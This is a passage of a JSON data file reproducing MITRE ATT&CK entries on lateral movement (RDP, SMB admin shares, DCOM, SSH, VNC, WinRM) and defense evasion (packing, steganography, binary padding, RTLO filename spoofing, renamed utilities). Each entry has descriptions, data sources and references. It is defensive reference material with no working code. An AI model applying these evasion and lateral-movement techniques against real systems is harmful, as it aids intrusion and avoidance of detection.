    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the <a href=\"https://attack.mitre.org/techniques/T1546/008\">Accessibility Features</a> technique for Persistence.(Citation: Alperovitch Malware)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "TechNet Remote Desktop Services",
        "url": "https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx",
        "description": "Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Alperovitch Malware",
        "url": "http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/",
        "description": "Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541",
    "platform": "windows",
    "tid": "T1021.002",
    "technique": "SMB/Windows Admin Shares",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.<!-- raw HTML omitted --><!-- raw HTML omitted -->Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. Adversaries may use this technique in conjunction with administrator-level <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are <a href=\"https://attack.mitre.org/techniques/T1053\">Scheduled Task/Job</a>, <a href=\"https://attack.mitre.org/techniques/T1569/002\">Service Execution</a>, and <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a>. Adversaries can also use NTLM hashes to access administrator shares on systems with <a href=\"https://attack.mitre.org/techniques/T1550/002\">Pass the Hash</a> and certain configuration and patch levels.(Citation: Microsoft Admin Shares)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/561.html",
        "description": "none",
        "external_id": "CAPEC-561"
      },
      {
        "source_name": "Wikipedia Server Message Block",
        "url": "https://en.wikipedia.org/wiki/Server_Message_Block",
        "description": "Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet RPC",
        "url": "https://technet.microsoft.com/en-us/library/cc787851.aspx",
        "description": "Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Admin Shares",
        "url": "http://support.microsoft.com/kb/314984",
        "description": "Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Lateral Movement Payne",
        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts",
        "description": "Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Windows Event Forwarding Payne",
        "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem",
        "description": "Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting WMI Persistence",
        "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96",
        "description": "French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--68a0c5ed-bee2-4513-830d-5b0d650139bd",
    "platform": "windows",
    "tid": "T1021.003",
    "technique": "Distributed Component Object Model",
    "tactic": "lateral-movement",
    "datasources": "api-monitoring|authentication-logs|dll-monitoring|packet-capture|powershell-logs|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)<!-- raw HTML omitted --><!-- raw HTML omitted -->Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)<!-- raw HTML omitted --><!-- raw HTML omitted -->Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke Dynamic Data Exchange (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document.</p>\n",
    "technique_references": [
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx",
        "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Process Wide Com Keys",
        "url": "https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx",
        "description": "Microsoft. (n.d.). Setting Process-Wide Security Through the Registry. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft COM ACL",
        "url": "https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1",
        "description": "Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Outlook DCOM Lateral Movement Nov 2017",
        "url": "https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",
        "description": "Nelson, M. (2017, November 16). Lateral Movement using Outlook's CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma MMC20 COM Jan 2017",
        "url": "https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",
        "description": "Nelson, M. (2017, January 5). Lateral Movement using the MMC20 Application COM Object. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma DCOM Lateral Movement Jan 2017",
        "url": "https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",
        "description": "Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round 2. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Enigma Excel DCOM Sept 2017",
        "url": "https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",
        "description": "Nelson, M. (2017, September 11). Lateral Movement using Excel.Application and DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Cyberreason DCOM DDE Lateral Movement Nov 2017",
        "url": "https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom",
        "description": "Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral movement via DCOM. Retrieved November 21, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
    "platform": "linux|macos",
    "tid": "T1021.004",
    "technique": "SSH",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|netflow-enclave-netflow|network-protocol-analysis|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user’s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.(Citation: SSH Secure Shell)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      },
      {
        "source_name": "SSH Secure Shell",
        "url": "https://www.ssh.com/ssh",
        "description": "SSH.COM. (n.d.). SSH (Secure Shell). Retrieved March 23, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b",
    "platform": "linux|macos|windows",
    "tid": "T1021.005",
    "technique": "VNC",
    "tactic": "lateral-movement",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->VNC is a desktop sharing system that allows users to remotely control another computer’s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/555.html",
        "description": "none",
        "external_id": "CAPEC-555"
      }
    ]
  },
  {
    "id": "attack-pattern--60d0c01d-e2bf-49dd-a453-f8a9c9fa6f65",
    "platform": "windows",
    "tid": "T1021.006",
    "technique": "Windows Remote Management",
    "tactic": "lateral-movement",
    "datasources": "authentication-logs|file-monitoring|netflow-enclave-netflow|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a> to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.<!-- raw HTML omitted --><!-- raw HTML omitted -->WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft WinRM",
        "url": "http://msdn.microsoft.com/en-us/library/aa384426",
        "description": "Microsoft. (n.d.). Windows Remote Management. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Jacobsen 2014",
        "url": "https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2",
        "description": "Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Detecting Lateral Movement",
        "url": "https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc",
        "description": "French, D. (2018, September 30). Detecting Lateral Movement Using Sysmon and Splunk. Retrieved October 11, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5",
    "platform": "linux|macos|windows",
    "tid": "T1027.001",
    "technique": "Binary Padding",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|malware-reverse-engineering|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. <!-- raw HTML omitted --><!-- raw HTML omitted -->Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/572.html",
        "description": "none",
        "external_id": "CAPEC-572"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/655.html",
        "description": "none",
        "external_id": "CAPEC-655"
      },
      {
        "source_name": "ESET OceanLotus",
        "url": "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/",
        "description": "Foltýn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Securelist Malware Tricks April 2017",
        "url": "https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/",
        "description": "Ishimaru, S.. (2017, April 13). Old Malware Tricks To Bypass Detection in the Age of Big Data. Retrieved May 30, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "VirusTotal FAQ",
        "url": "https://www.virustotal.com/en/faq/",
        "description": "VirusTotal. (n.d.). VirusTotal FAQ. Retrieved May 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
    "platform": "macos|windows",
    "tid": "T1027.002",
    "technique": "Software Packing",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable’s original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) <!-- raw HTML omitted --><!-- raw HTML omitted -->Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/570.html",
        "description": "none",
        "external_id": "CAPEC-570"
      },
      {
        "source_name": "ESET FinFisher Jan 2018",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf",
        "description": "Kafka, F. (2018, January). ESET's Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia Exe Compression",
        "url": "http://en.wikipedia.org/wiki/Executable_compression",
        "description": "Executable compression. (n.d.). Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c2e147a9-d1a8-4074-811a-d8789202d916",
    "platform": "linux|macos|windows",
    "tid": "T1027.003",
    "technique": "Steganography",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/software/S0038\">Duqu</a> was an early example of malware that used steganography. It encrypted the gathered information from a victim’s system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) <!-- raw HTML omitted --><!-- raw HTML omitted -->By the end of 2017, a threat group used <!-- raw HTML omitted -->Invoke-PSImage<!-- raw HTML omitted --> to hide <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> commands in an image file (.png) and execute the code on a victim’s system. In this particular case the <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> code downloaded another obfuscated script to gather intelligence from the victim’s machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/636.html",
        "description": "none",
        "external_id": "CAPEC-636"
      },
      {
        "source_name": "Wikipedia Duqu",
        "url": "https://en.wikipedia.org/wiki/Duqu",
        "description": "Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "McAfee Malicious Doc Targets Pyeongchang Olympics",
        "url": "https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/",
        "description": "Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617",
    "platform": "linux|macos|windows",
    "tid": "T1027.004",
    "technique": "Compile After Delivery",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)</p>\n",
    "technique_references": [
      {
        "source_name": "ClearSky MuddyWater Nov 2018",
        "url": "https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf",
        "description": "ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMicro WindowsAppMac",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/",
        "description": "Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads Info Stealer and Adware. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92",
    "platform": "linux|macos|windows",
    "tid": "T1027.005",
    "technique": "Indicator Removal from Tools",
    "tactic": "defense-evasion",
    "datasources": "anti-virus|binary-file-metadata|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target’s defensive systems or subsequent targets that may use similar systems.<!-- raw HTML omitted --><!-- raw HTML omitted -->A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52",
    "platform": "macos|windows",
    "tid": "T1036.001",
    "technique": "Invalid Code Signature",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Unlike <a href=\"https://attack.mitre.org/techniques/T1553/002\">Code Signing</a>, this activity will not result in a valid signature.</p>\n",
    "technique_references": [
      {
        "source_name": "Threatexpress MetaTwin 2017",
        "url": "https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/",
        "description": "Vest, J. (2017, October 9). Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads. Retrieved September 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--77eae145-55db-4519-8ae5-77b0c7215d69",
    "platform": "linux|macos|windows",
    "tid": "T1036.002",
    "technique": "Right-to-Left Override",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver executable named <!-- raw HTML omitted -->March 25 \\u202Excod.scr<!-- raw HTML omitted --> will display as <!-- raw HTML omitted -->March 25 rcs.docx<!-- raw HTML omitted -->. A JavaScript file named <!-- raw HTML omitted -->photo_high_re\\u202Egnp.js<!-- raw HTML omitted --> will be displayed as <!-- raw HTML omitted -->photo_high_resj.png<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->A common use of this technique is with <a href=\"https://attack.mitre.org/techniques/T1566/001\">Spearphishing Attachment</a>/<a href=\"https://attack.mitre.org/techniques/T1204/002\">Malicious File</a> since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.</p>\n",
    "technique_references": [
      {
        "source_name": "Infosecinstitute RTLO Technique",
        "url": "https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/",
        "description": "Security Ninja. (2015, April 16). Spoof Using Right to Left Override (RTLO) Technique. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro PLEAD RTLO",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/",
        "description": "Alintanahin, K.. (2014, May 23). PLEAD Targeted Attacks Against Taiwanese Government Agencies. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky RTLO Cyber Crime",
        "url": "https://securelist.com/zero-day-vulnerability-in-telegram/83800/",
        "description": "Firsh, A.. (2018, February 13). Zero-day vulnerability in Telegram - Cybercriminals exploited Telegram flaw to launch multipurpose attacks. Retrieved April 22, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bd5b58a4-a52d-4a29-bc0d-3f1d3968eb6b",
    "platform": "linux|macos|windows",
    "tid": "T1036.003",
    "technique": "Rename System Utilities",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. (Citation: LOLBAS Main Site) It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <!-- raw HTML omitted -->rundll32.exe<!-- raw HTML omitted -->). (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)</p>\n",
    "technique_references": [
      {
        "source_name": "LOLBAS Main Site",
        "url": "https://lolbas-project.github.io/",
        "description": "LOLBAS. (n.d.). Living Off The Land Binaries and Scripts (and also Libraries). Retrieved February 10, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Masquerade Ball",
        "url": "http://pages.endgame.com/rs/627-YBU-612/images/EndgameJournal_The%20Masquerade%20Ball_Pages_R2.pdf",
        "description": "Ewing, P. (2016, October 31). How to Hunt: The Masquerade Ball. Retrieved October 31, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "F-Secure CozyDuke",
        "url": "https://www.f-secure.com/documents/996508/1030745/CozyDuke",
        "description": "F-Secure Labs. (2015, April 22). CozyDuke: Malware Analysis. Retrieved December 10, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "Twitter ItsReallyNick Masquerading Update",
        "url": "https://twitter.com/ItsReallyNick/status/1055321652777619457",
        "description": "Carr, N.. (2018, October 25). Nick Carr Status Update Masquerading. Retrieved April 22, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c",
    "platform": "windows|linux",
    "tid": "T1036.004",
    "technique": "Masquerade Task or Service",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
